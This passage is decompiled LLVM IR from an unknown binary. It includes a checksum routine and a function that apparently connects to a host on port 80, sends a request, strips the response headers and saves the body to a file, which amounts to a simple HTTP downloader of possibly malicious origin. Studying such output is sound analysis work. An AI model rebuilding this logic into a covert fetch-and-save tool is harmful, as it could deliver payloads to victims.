dec_label_pc_10000ea8:                            ; preds = %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge, %dec_label_pc_10000e9c
  %stack_var_-28.0.lcssa17 = phi i16* [ %v5_10000e80, %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge ], [ %arg1, %dec_label_pc_10000e9c ]
  %stack_var_-32.0.lcssa16 = phi i32 [ %v2_10000e70, %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge ], [ 0, %dec_label_pc_10000e9c ]
  %v1_10000eb0 = bitcast i16* %stack_var_-28.0.lcssa17 to i8*
  %v2_10000eb0 = load i8, i8* %v1_10000eb0, align 1
  %v3_10000eb0 = zext i8 %v2_10000eb0 to i32
  %v2_10000ec8 = add i32 %v3_10000eb0, %stack_var_-32.0.lcssa16
  br label %dec_label_pc_10000ed0

dec_label_pc_10000ed0:                            ; preds = %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge, %dec_label_pc_10000e9c, %dec_label_pc_10000ea8
  %stack_var_-32.1 = phi i32 [ %v2_10000ec8, %dec_label_pc_10000ea8 ], [ 0, %dec_label_pc_10000e9c ], [ %v2_10000e70, %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge ]
  %v4_10000ed4 = sdiv i32 %stack_var_-32.1, 65536
  %v1_10000edc = urem i32 %stack_var_-32.1, 65536
  %v2_10000ee0 = add nsw i32 %v4_10000ed4, %v1_10000edc
  %v4_10000eec = sdiv i32 %v2_10000ee0, 65536
  %v2_10000ef4 = add nsw i32 %v4_10000eec, %v2_10000ee0
  %v2_10000f0018 = urem i32 %v2_10000ef4, 65536
  %v1_10000f0c = xor i32 %v2_10000f0018, 65535
  ret i32 %v1_10000f0c

; uselistorder directives
  uselistorder i32 %v2_10000ee0, { 1, 0 }
  uselistorder i32 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %v1_10000e88, { 0, 2, 1 }
  uselistorder i32 %v2_10000e70, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10000ed0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10000ea8, { 1, 0 }
  uselistorder label %dec_label_pc_10000e60, { 1, 0 }
}

define i32 @function_10000f30(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10000f30:
  %r11.global-to-local = alloca i32, align 4
  %stack_var_-4140 = alloca i32, align 4
  %stack_var_-5176 = alloca i32, align 4
  %stack_var_-5180 = alloca i32, align 4
  %stack_var_-5224 = alloca i32, align 4
  %stack_var_-5164 = alloca i32, align 4
  %stack_var_-5232 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10000f30 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10000f30, i32* %stack_var_-5232, align 4
  %v1_10000f5c = call i32 @function_100004f0(i32 %arg2)
  %v3_10000f64 = icmp eq i32 %v1_10000f5c, 0
  br i1 %v3_10000f64, label %dec_label_pc_10000f6c, label %dec_label_pc_10001504

dec_label_pc_10000f6c:                            ; preds = %dec_label_pc_10000f30
  %v2_10000f70 = icmp sgt i32 %arg3, 1
  br i1 %v2_10000f70, label %dec_label_pc_10000f98, label %dec_label_pc_10000f78

dec_label_pc_10000f78:                            ; preds = %dec_label_pc_10000f6c
  %v5_10000f8c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_1000d410.22 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10000f94 = call i32 @function_10008dd4()
  br label %dec_label_pc_10000f98

dec_label_pc_10000f98:                            ; preds = %dec_label_pc_10000f6c, %dec_label_pc_10000f78
  store i32 268439464, i32* @lr, align 4
  %v3_10000fa4 = call i32 @function_10008068(i32 2, i32 1, i32 0)
  %v4_10000fb8 = icmp eq i32 %v3_10000fa4, -1
  br i1 %v4_10000fb8, label %dec_label_pc_10000fc0, label %dec_label_pc_10000fe0

dec_label_pc_10000fc0:                            ; preds = %dec_label_pc_10000f98
  %v5_10000fd4 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1000d434.25 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10000fdc = call i32 @function_10008dd4()
  br label %dec_label_pc_10000fe0

dec_label_pc_10000fe0:                            ; preds = %dec_label_pc_10000f98, %dec_label_pc_10000fc0
  %v1_10000fe4 = add i32 %arg4, 4
  %v1_10000fe8 = inttoptr i32 %v1_10000fe4 to i32*
  %v2_10000fe8 = load i32, i32* %v1_10000fe8, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1000d45c.27 to i32), i32* @r4, align 4
  %v5_10000ffc = inttoptr i32 %v2_10000fe8 to i8*
  %v6_10000ffc = call i32 @function_10007328(i8* %v5_10000ffc, i32 ptrtoint ([8 x i8]* @global_var_1000d45c.27 to i32), i32 7, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10001004 = icmp eq i32 %v6_10000ffc, 0
  %v2_10001014 = load i32, i32* %v1_10000fe8, align 4
  br i1 %v3_10001004, label %dec_label_pc_1000100c, label %dec_label_pc_10001030

dec_label_pc_1000100c:                            ; preds = %dec_label_pc_10000fe0
  %v1_10001018 = add i32 %v2_10001014, 7
  %v2_1000101c = ptrtoint i32* %stack_var_-5164 to i32
  %v2_10001028 = inttoptr i32 %v1_10001018 to i8*
  %v3_10001028 = call i32 @function_10007264(i32 %v2_1000101c, i8* %v2_10001028)
  br label %dec_label_pc_1000104c

dec_label_pc_10001030:                            ; preds = %dec_label_pc_10000fe0
  %v2_1000103c = ptrtoint i32* %stack_var_-5164 to i32
  %v2_10001048 = inttoptr i32 %v2_10001014 to i8*
  %v3_10001048 = call i32 @function_10007264(i32 %v2_1000103c, i8* %v2_10001048)
  br label %dec_label_pc_1000104c

dec_label_pc_1000104c:                            ; preds = %dec_label_pc_1000100c, %dec_label_pc_10001030
  %v2_10001068.pre-phi = phi i32 [ %v2_1000101c, %dec_label_pc_1000100c ], [ %v2_1000103c, %dec_label_pc_10001030 ]
  %v2_10001084 = ptrtoint i32* %stack_var_-5224 to i32
  store i32 %v2_10001068.pre-phi, i32* @r3, align 4
  %v0_1000107065 = call i32 @function_10007284()
  %v2_1000107867 = icmp eq i32 %v0_1000107065, 0
  br i1 %v2_1000107867, label %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge, label %dec_label_pc_10001080

dec_label_pc_10001058:                            ; preds = %dec_label_pc_10001080
  %v1_1000105c = add i32 %storemerge570, 1
  store i32 %v2_10001068.pre-phi, i32* @r3, align 4
  %v0_10001070 = call i32 @function_10007284()
  %v2_10001078 = icmp ult i32 %v1_1000105c, %v0_10001070
  br i1 %v2_10001078, label %dec_label_pc_10001080, label %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge

dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge: ; preds = %dec_label_pc_1000104c, %dec_label_pc_10001058
  %storemerge5.lcssa = phi i32 [ 0, %dec_label_pc_1000104c ], [ %v1_1000105c, %dec_label_pc_10001058 ]
  %.pre29 = add i32 %storemerge5.lcssa, %v2_10001084
  %.pre30 = add i32 %.pre29, 60
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_1000109c

dec_label_pc_10001080:                            ; preds = %dec_label_pc_1000104c, %dec_label_pc_10001058
  %storemerge570 = phi i32 [ %v1_1000105c, %dec_label_pc_10001058 ], [ 0, %dec_label_pc_1000104c ]
  %v2_10001088 = add i32 %storemerge570, %v2_10001084
  %v1_1000108c = add i32 %v2_10001088, 60
  %v2_1000108c = inttoptr i32 %v1_1000108c to i8*
  %v3_1000108c = load i8, i8* %v2_1000108c, align 1
  %v3_10001094 = icmp eq i8 %v3_1000108c, 47
  br i1 %v3_10001094, label %dec_label_pc_1000109c, label %dec_label_pc_10001058

dec_label_pc_1000109c:                            ; preds = %dec_label_pc_10001080, %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge
  %storemerge564 = phi i32 [ %storemerge5.lcssa, %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge ], [ %storemerge570, %dec_label_pc_10001080 ]
  %v4_100010ac.pre-phi = phi i8* [ %.pre31, %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge ], [ %v2_1000108c, %dec_label_pc_10001080 ]
  store i8 0, i8* %v4_100010ac.pre-phi, align 1
  store i32 2, i32* %stack_var_-5180, align 4
  store i32 80, i32* @r3, align 4
  %v1_100010bc = call i32 @function_100079f0(i32 80)
  store i32 268439764, i32* @lr, align 4
  %v1_100010d0 = call i32 @function_10007b1c(i32 %v2_10001068.pre-phi)
  %v4_100010e4 = icmp eq i32 %v1_100010d0, -1
  br i1 %v4_100010e4, label %dec_label_pc_100010ec, label %dec_label_pc_10001160

dec_label_pc_100010ec:                            ; preds = %dec_label_pc_1000109c
  store i32 268439800, i32* @lr, align 4
  %v2_100010f4 = call i32 @function_10007b50(i32 %v2_10001068.pre-phi, i32 -1)
  %v3_10001104 = icmp eq i32 %v2_100010f4, 0
  br i1 %v3_10001104, label %dec_label_pc_1000110c, label %dec_label_pc_1000112c

dec_label_pc_1000110c:                            ; preds = %dec_label_pc_100010ec
  %v5_10001120 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1000d464.30 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10001128 = call i32 @function_10008dd4()
  br label %dec_label_pc_1000112c

dec_label_pc_1000112c:                            ; preds = %dec_label_pc_100010ec, %dec_label_pc_1000110c
  %v2_10001130 = ptrtoint i32* %stack_var_-5176 to i32
  %v1_10001138 = add i32 %v2_100010f4, 16
  %v2_10001138 = inttoptr i32 %v1_10001138 to i32*
  %v3_10001138 = load i32, i32* %v2_10001138, align 4
  %v1_1000113c = inttoptr i32 %v3_10001138 to i32*
  %v2_1000113c = load i32, i32* %v1_1000113c, align 4
  store i32 %v2_1000113c, i32* %r11.global-to-local, align 4
  %v1_10001144 = add i32 %v2_100010f4, 12
  %v2_10001144 = inttoptr i32 %v1_10001144 to i32*
  %v3_10001144 = load i32, i32* %v2_10001144, align 4
  store i32 %v2_10001130, i32* @r3, align 4
  store i32 %v2_1000113c, i32* @r4, align 4
  store i32 %v3_10001144, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000115c.33 to i32), i32* @lr, align 4
  %v0_10001158 = call i32 @function_10007104()
  br label %dec_label_pc_10001168

dec_label_pc_10001160:                            ; preds = %dec_label_pc_1000109c
  store i32 %v1_100010d0, i32* %stack_var_-5176, align 4
  br label %dec_label_pc_10001168

dec_label_pc_10001168:                            ; preds = %dec_label_pc_1000112c, %dec_label_pc_10001160
  %v2_10001180.pre-phi = ptrtoint i32* %stack_var_-5180 to i32
  store i32 268439956, i32* @lr, align 4
  %v3_10001190 = call i32 @function_10007f50(i32 %v3_10000fa4, i32 %v2_10001180.pre-phi, i32 16)
  %v3_10001198 = icmp eq i32 %v3_10001190, 0
  br i1 %v3_10001198, label %dec_label_pc_100011c0, label %dec_label_pc_100011a0

dec_label_pc_100011a0:                            ; preds = %dec_label_pc_10001168
  %v5_100011b4 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1000d48c.34 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_100011bc = call i32 @function_10008dd4()
  br label %dec_label_pc_100011c0

dec_label_pc_100011c0:                            ; preds = %dec_label_pc_10001168, %dec_label_pc_100011a0
  %v2_100011c8 = add i32 %v2_10001068.pre-phi, 1
  %v1_100011cc = add i32 %v2_100011c8, %storemerge564
  store i32 %v2_10001068.pre-phi, i32* %r11.global-to-local, align 4
  %v6_100011ec = call i32 @function_1000041c(i32 %v3_10000fa4, i32 ptrtoint ([276 x i8]* @global_var_1000d4b4.36 to i32), i32 %v1_100011cc, i32 %v2_10001068.pre-phi)
  %v5_10001204 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_1000d5c8.37 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v1_1000120c = add i32 %arg4, 8
  %v1_10001210 = inttoptr i32 %v1_1000120c to i32*
  %v2_10001210 = load i32, i32* %v1_10001210, align 4
  store i32 268440100, i32* @lr, align 4
  %v3_10001220 = call i32 @function_10004f90(i32 %v2_10001210, i32 ptrtoint ([3 x i8]* @global_var_1000d5e4.38 to i32))
  %v2_1000122c = ptrtoint i32* %stack_var_-4140 to i32
  br label %dec_label_pc_1000122c

dec_label_pc_1000122c:                            ; preds = %dec_label_pc_10001388, %dec_label_pc_100011c0
  store i32 268440132, i32* @lr, align 4
  %v4_10001240 = call i32 @function_10007fb4(i32 %v3_10000fa4, i32 %v2_1000122c, i32 4096, i32 0)
  %tmp58 = icmp slt i32 %v4_10001240, 1
  br i1 %tmp58, label %dec_label_pc_100013a8, label %dec_label_pc_10001258

dec_label_pc_10001258:                            ; preds = %dec_label_pc_1000122c
  %v2_1000125c = icmp sgt i32 %v4_10001240, 4095
  br i1 %v2_1000125c, label %dec_label_pc_10001284.lr.ph, label %dec_label_pc_10001264

dec_label_pc_10001264:                            ; preds = %dec_label_pc_10001258
  %v2_1000126c = add i32 %v4_10001240, %v2_10001084
  %v3_10001274 = add i32 %v2_1000126c, 1084
  %v4_10001274 = inttoptr i32 %v3_10001274 to i8*
  store i8 0, i8* %v4_10001274, align 1
  br label %dec_label_pc_10001284.lr.ph

dec_label_pc_10001284.lr.ph:                      ; preds = %dec_label_pc_10001264, %dec_label_pc_10001258
  br label %dec_label_pc_10001284

dec_label_pc_10001284:                            ; preds = %dec_label_pc_10001284.lr.ph, %dec_label_pc_10001388
  %storemerge625 = phi i32 [ 0, %dec_label_pc_10001284.lr.ph ], [ %v1_1000138c, %dec_label_pc_10001388 ]
  %v2_10001290 = add i32 %storemerge625, %v2_1000122c
  store i32 ptrtoint ([5 x i8]* @global_var_1000d5e8.39 to i32), i32* @r4, align 4
  %v5_100012a4 = inttoptr i32 %v2_10001290 to i8*
  %v6_100012a4 = call i32 @function_10007328(i8* %v5_100012a4, i32 ptrtoint ([5 x i8]* @global_var_1000d5e8.39 to i32), i32 4, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_100012ac = icmp eq i32 %v6_100012a4, 0
  br i1 %v3_100012ac, label %dec_label_pc_100012b4, label %dec_label_pc_10001388

dec_label_pc_100012b4:                            ; preds = %dec_label_pc_10001284
  %v1_100012b8 = add i32 %storemerge625, 4
  %v2_1000137c18 = icmp slt i32 %v1_100012b8, %v4_10001240
  br i1 %v2_1000137c18, label %dec_label_pc_100012c4.lr.ph, label %dec_label_pc_100013a8

dec_label_pc_100012c4.lr.ph:                      ; preds = %dec_label_pc_100012b4
  %v1_100012d0 = add i32 %v3_10001220, 52
  %v2_100012d0 = inttoptr i32 %v1_100012d0 to i32*
  %v1_100012e0 = add i32 %v3_10001220, 16
  %v2_100012e0 = inttoptr i32 %v1_100012e0 to i32*
  %v1_100012e8 = add i32 %v3_10001220, 28
  %v2_100012e8 = inttoptr i32 %v1_100012e8 to i32*
  br label %dec_label_pc_100012c4

dec_label_pc_100012c4:                            ; preds = %dec_label_pc_100012c4.lr.ph, %dec_label_pc_10001368
  %storemerge721 = phi i32 [ %v1_100012b8, %dec_label_pc_100012c4.lr.ph ], [ %v1_1000136c, %dec_label_pc_10001368 ]
  %v3_100012d0 = load i32, i32* %v2_100012d0, align 4
  %v3_100012d4 = icmp eq i32 %v3_100012d0, 0
  br i1 %v3_100012d4, label %dec_label_pc_10001348, label %dec_label_pc_100012dc

dec_label_pc_100012dc:                            ; preds = %dec_label_pc_100012c4
  %v3_100012e0 = load i32, i32* %v2_100012e0, align 4
  store i32 %v3_100012e0, i32* %r11.global-to-local, align 4
  %v3_100012e8 = load i32, i32* %v2_100012e8, align 4
  %v2_100012ec = icmp ult i32 %v3_100012e0, %v3_100012e8
  br i1 %v2_100012ec, label %dec_label_pc_100012f4, label %dec_label_pc_10001324

dec_label_pc_100012f4:                            ; preds = %dec_label_pc_100012dc
  %v3_100012f8 = load i32, i32* %v2_100012e0, align 4
  store i32 %v3_100012f8, i32* %r11.global-to-local, align 4
  %v2_10001304 = add i32 %storemerge721, %v2_10001084
  %v1_10001308 = add i32 %v2_10001304, 1084
  %v2_10001308 = inttoptr i32 %v1_10001308 to i8*
  %v3_10001308 = load i8, i8* %v2_10001308, align 1
  %v3_10001310 = inttoptr i32 %v3_100012f8 to i8*
  store i8 %v3_10001308, i8* %v3_10001310, align 1
  %v0_10001314 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001314 = add i32 %v0_10001314, 1
  store i32 %v1_10001314, i32* %v2_100012e0, align 4
  br label %dec_label_pc_10001368

dec_label_pc_10001324:                            ; preds = %dec_label_pc_100012dc
  %v2_1000132c = add i32 %storemerge721, %v2_10001084
  %v1_10001330 = add i32 %v2_1000132c, 1084
  %v2_10001330 = inttoptr i32 %v1_10001330 to i8*
  %v3_10001330 = load i8, i8* %v2_10001330, align 1
  store i32 ptrtoint (i32* @global_var_10001344.40 to i32), i32* @lr, align 4
  %v4_10001340 = call i32 @function_10006ecc(i8 %v3_10001330, i32 %v3_10001220, i32 %v2_1000132c)
  br label %dec_label_pc_10001368

dec_label_pc_10001348:                            ; preds = %dec_label_pc_100012c4
  %v2_10001350 = add i32 %storemerge721, %v2_10001084
  %v1_10001354 = add i32 %v2_10001350, 1084
  %v2_10001354 = inttoptr i32 %v1_10001354 to i8*
  %v3_10001354 = load i8, i8* %v2_10001354, align 1
  store i32 268440424, i32* @lr, align 4
  %v4_10001364 = call i32 @function_100069e0(i8 %v3_10001354, i32 %v3_10001220, i32 %v2_10001350)
  br label %dec_label_pc_10001368

dec_label_pc_10001368:                            ; preds = %dec_label_pc_10001324, %dec_label_pc_100012f4, %dec_label_pc_10001348
  %v1_1000136c = add i32 %storemerge721, 1
  %v2_1000137c = icmp slt i32 %v1_1000136c, %v4_10001240
  br i1 %v2_1000137c, label %dec_label_pc_100012c4, label %dec_label_pc_100013a8

dec_label_pc_10001388:                            ; preds = %dec_label_pc_10001284
  %v1_1000138c = add nuw nsw i32 %storemerge625, 1
  %v2_1000139c = icmp slt i32 %v1_1000138c, %v4_10001240
  br i1 %v2_1000139c, label %dec_label_pc_10001284, label %dec_label_pc_1000122c

dec_label_pc_100013a8:                            ; preds = %dec_label_pc_1000122c, %dec_label_pc_10001368, %dec_label_pc_100012b4
  %v2_100013b0 = load i32, i32* %v1_10001210, align 4
  %v6_100013cc = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_1000d5f0.41 to i32), i32 %arg2, i32 %v2_100013b0)
  %v1_10001434 = add i32 %v3_10001220, 52
  %v2_10001434 = inttoptr i32 %v1_10001434 to i32*
  %v1_10001444 = add i32 %v3_10001220, 16
  %v2_10001444 = inttoptr i32 %v1_10001444 to i32*
  %v1_1000144c = add i32 %v3_10001220, 28
  %v2_1000144c = inttoptr i32 %v1_1000144c to i32*
  br label %dec_label_pc_100013d0

dec_label_pc_100013d0:                            ; preds = %dec_label_pc_100014cc, %dec_label_pc_100013a8
  store i32 268440552, i32* @lr, align 4
  %v4_100013e4 = call i32 @function_10007fb4(i32 %v3_10000fa4, i32 %v2_1000122c, i32 4096, i32 0)
  %tmp59 = icmp slt i32 %v4_100013e4, 1
  br i1 %tmp59, label %dec_label_pc_100014ec, label %dec_label_pc_100013fc

dec_label_pc_100013fc:                            ; preds = %dec_label_pc_100013d0
  %v2_10001400 = icmp sgt i32 %v4_100013e4, 4095
  br i1 %v2_10001400, label %dec_label_pc_10001428.lr.ph, label %dec_label_pc_10001408

dec_label_pc_10001408:                            ; preds = %dec_label_pc_100013fc
  %v2_10001410 = add i32 %v4_100013e4, %v2_10001084
  %v3_10001418 = add i32 %v2_10001410, 1084
  %v4_10001418 = inttoptr i32 %v3_10001418 to i8*
  store i8 0, i8* %v4_10001418, align 1
  br label %dec_label_pc_10001428.lr.ph

dec_label_pc_10001428.lr.ph:                      ; preds = %dec_label_pc_10001408, %dec_label_pc_100013fc
  br label %dec_label_pc_10001428

dec_label_pc_10001428:                            ; preds = %dec_label_pc_10001428.lr.ph, %dec_label_pc_100014cc
  %storemerge817 = phi i32 [ 0, %dec_label_pc_10001428.lr.ph ], [ %v1_100014d0, %dec_label_pc_100014cc ]
  store i32 %v3_10001220, i32* %stack_var_-5224, align 4
  %v3_10001434 = load i32, i32* %v2_10001434, align 4
  %v3_10001438 = icmp eq i32 %v3_10001434, 0
  br i1 %v3_10001438, label %dec_label_pc_100014ac, label %dec_label_pc_10001440

dec_label_pc_10001440:                            ; preds = %dec_label_pc_10001428
  %v3_10001444 = load i32, i32* %v2_10001444, align 4
  store i32 %v3_10001444, i32* %r11.global-to-local, align 4
  %v3_1000144c = load i32, i32* %v2_1000144c, align 4
  %v2_10001450 = icmp ult i32 %v3_10001444, %v3_1000144c
  br i1 %v2_10001450, label %dec_label_pc_10001458, label %dec_label_pc_10001488

dec_label_pc_10001458:                            ; preds = %dec_label_pc_10001440
  %v3_1000145c = load i32, i32* %v2_10001444, align 4
  store i32 %v3_1000145c, i32* %r11.global-to-local, align 4
  %v2_10001468 = add i32 %storemerge817, %v2_10001084
  %v1_1000146c = add i32 %v2_10001468, 1084
  %v2_1000146c = inttoptr i32 %v1_1000146c to i8*
  %v3_1000146c = load i8, i8* %v2_1000146c, align 1
  %v3_10001474 = inttoptr i32 %v3_1000145c to i8*
  store i8 %v3_1000146c, i8* %v3_10001474, align 1
  %v0_10001478 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001478 = add i32 %v0_10001478, 1
  %v3_1000147c = load i32, i32* %stack_var_-5224, align 4
  %v2_10001480 = add i32 %v3_1000147c, 16
  %v3_10001480 = inttoptr i32 %v2_10001480 to i32*
  store i32 %v1_10001478, i32* %v3_10001480, align 4
  br label %dec_label_pc_100014cc

dec_label_pc_10001488:                            ; preds = %dec_label_pc_10001440
  %v2_10001490 = add i32 %storemerge817, %v2_10001084
  %v1_10001494 = add i32 %v2_10001490, 1084
  %v2_10001494 = inttoptr i32 %v1_10001494 to i8*
  %v3_10001494 = load i8, i8* %v2_10001494, align 1
  store i32 ptrtoint (i32* @global_var_100014a8.42 to i32), i32* @lr, align 4
  %v4_100014a4 = call i32 @function_10006ecc(i8 %v3_10001494, i32 %v3_10001220, i32 %v2_10001490)
  br label %dec_label_pc_100014cc

dec_label_pc_100014ac:                            ; preds = %dec_label_pc_10001428
  %v2_100014b4 = add i32 %storemerge817, %v2_10001084
  %v1_100014b8 = add i32 %v2_100014b4, 1084
  %v2_100014b8 = inttoptr i32 %v1_100014b8 to i8*
  %v3_100014b8 = load i8, i8* %v2_100014b8, align 1
  store i32 268440780, i32* @lr, align 4
  %v4_100014c8 = call i32 @function_100069e0(i8 %v3_100014b8, i32 %v3_10001220, i32 %v2_100014b4)
  br label %dec_label_pc_100014cc

dec_label_pc_100014cc:                            ; preds = %dec_label_pc_10001488, %dec_label_pc_10001458, %dec_label_pc_100014ac
  %v1_100014d0 = add nuw nsw i32 %storemerge817, 1
  %v2_100014e0 = icmp slt i32 %v1_100014d0, %v4_100013e4
  br i1 %v2_100014e0, label %dec_label_pc_10001428, label %dec_label_pc_100013d0

dec_label_pc_100014ec:                            ; preds = %dec_label_pc_100013d0
  store i32 268440820, i32* @lr, align 4
  %v1_100014f0 = inttoptr i32 %v3_10001220 to i16*
  %v2_100014f0 = call i32 @function_10004e44(i16* %v1_100014f0)
  store i32 ptrtoint ([3 x i8]* @global_var_100014fc.43 to i32), i32* @lr, align 4
  %v1_100014f8 = call i32 @function_10004ab4(i32 %v3_10000fa4)
  %v0_10001500 = call i32 @function_10008dd4()
  br label %dec_label_pc_10001504

dec_label_pc_10001504:                            ; preds = %dec_label_pc_10000f30, %dec_label_pc_100014ec
  %v0_1000151c = phi i32 [ %v1_10000f5c, %dec_label_pc_10000f30 ], [ %v0_10001500, %dec_label_pc_100014ec ]
  %v2_10001504 = load i32, i32* %stack_var_-5232, align 4
  store i32 %v2_10001504, i32* %r11.global-to-local, align 4
  ret i32 %v0_1000151c

; uselistorder directives
  uselistorder i32 %storemerge817, { 3, 0, 1, 2 }
  uselistorder i32 %v4_100013e4, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge721, { 3, 0, 1, 2 }
  uselistorder i32 %storemerge625, { 2, 0, 1 }
  uselistorder i32 %v4_10001240, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_1000122c, { 1, 0, 2 }
  uselistorder i32 %v3_10001220, { 11, 0, 1, 9, 3, 2, 10, 7, 4, 6, 5, 8 }
  uselistorder i32 %storemerge570, { 0, 2, 1 }
  uselistorder i32 %storemerge5.lcssa, { 1, 0 }
  uselistorder i32 %v1_1000105c, { 2, 1, 0 }
  uselistorder i32 %v2_10001068.pre-phi, { 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 2, 3, 1, 4, 5, 0, 6 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_10001504, { 1, 0 }
  uselistorder label %dec_label_pc_100014cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001428, { 1, 0 }
  uselistorder label %dec_label_pc_100013a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001368, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100012c4, { 1, 0 }
  uselistorder label %dec_label_pc_10001284, { 1, 0 }
  uselistorder label %dec_label_pc_100011c0, { 1, 0 }
  uselistorder label %dec_label_pc_10001168, { 1, 0 }
  uselistorder label %dec_label_pc_1000112c, { 1, 0 }
  uselistorder label %dec_label_pc_10001080, { 1, 0 }
  uselistorder label %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000104c, { 1, 0 }
  uselistorder label %dec_label_pc_10000fe0, { 1, 0 }
  uselistorder label %dec_label_pc_10000f98, { 1, 0 }
}

define i32 @function_10001520(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001520:
  %tmp36 = call i8 @__decompiler_undefined_function_2()
  %v3_10001560 = load i32, i32* @global_var_10010464.16, align 4
  %v3_10001580 = icmp eq i32 %v3_10001560, 1
  %v3_1000159016 = zext i8 %tmp36 to i32
  br i1 %v3_10001580, label %dec_label_pc_10001588, label %dec_label_pc_100015f8

dec_label_pc_10001588:                            ; preds = %dec_label_pc_10001520
  %v9_100015f0 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1000d608.44 to i32), i32 %arg2, i32 %v3_1000159016)
  br label %dec_label_pc_100016c0

dec_label_pc_100015f8:                            ; preds = %dec_label_pc_10001520
  %v9_100016bc = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_1000d628.46 to i32), i32 %arg2, i32 %v3_1000159016)
  br label %dec_label_pc_100016c0

dec_label_pc_100016c0:                            ; preds = %dec_label_pc_10001588, %dec_label_pc_100015f8
  %storemerge = phi i32 [ %v9_100016bc, %dec_label_pc_100015f8 ], [ %v9_100015f0, %dec_label_pc_10001588 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_1000159016, { 1, 0 }
  uselistorder label %dec_label_pc_100016c0, { 1, 0 }
}

define i32 @function_100016e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100016e4:
  %v5_1000171c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1000d658.47 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  ret i32 %v5_1000171c
}

define i32 @function_10001738(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001738:
  %v3_10001760 = icmp eq i32 %arg3, 1
  br i1 %v3_10001760, label %dec_label_pc_10001784, label %dec_label_pc_10001768

dec_label_pc_10001768:                            ; preds = %dec_label_pc_10001738
  %v5_1000177c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_1000d678.48 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_100017e4

dec_label_pc_10001784:                            ; preds = %dec_label_pc_10001738
  %v1_10001788 = add i32 %arg4, 4
  %v1_1000178c = inttoptr i32 %v1_10001788 to i32*
  %v2_1000178c = load i32, i32* %v1_1000178c, align 4
  store i32 %v2_1000178c, i32* @r3, align 4
  %v0_10001794 = call i32 @function_10007284()
  %tmp9 = icmp ult i32 %v0_10001794, 10
  br i1 %tmp9, label %dec_label_pc_100017c0, label %dec_label_pc_100017a4

dec_label_pc_100017a4:                            ; preds = %dec_label_pc_10001784
  %v5_100017b8 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_1000d690.50 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_100017e4

dec_label_pc_100017c0:                            ; preds = %dec_label_pc_10001784
  %v2_100017c8 = load i32, i32* %v1_1000178c, align 4
  %v5_100017e0 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1000d6c8.52 to i32), i32 %v2_100017c8, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_100017e4

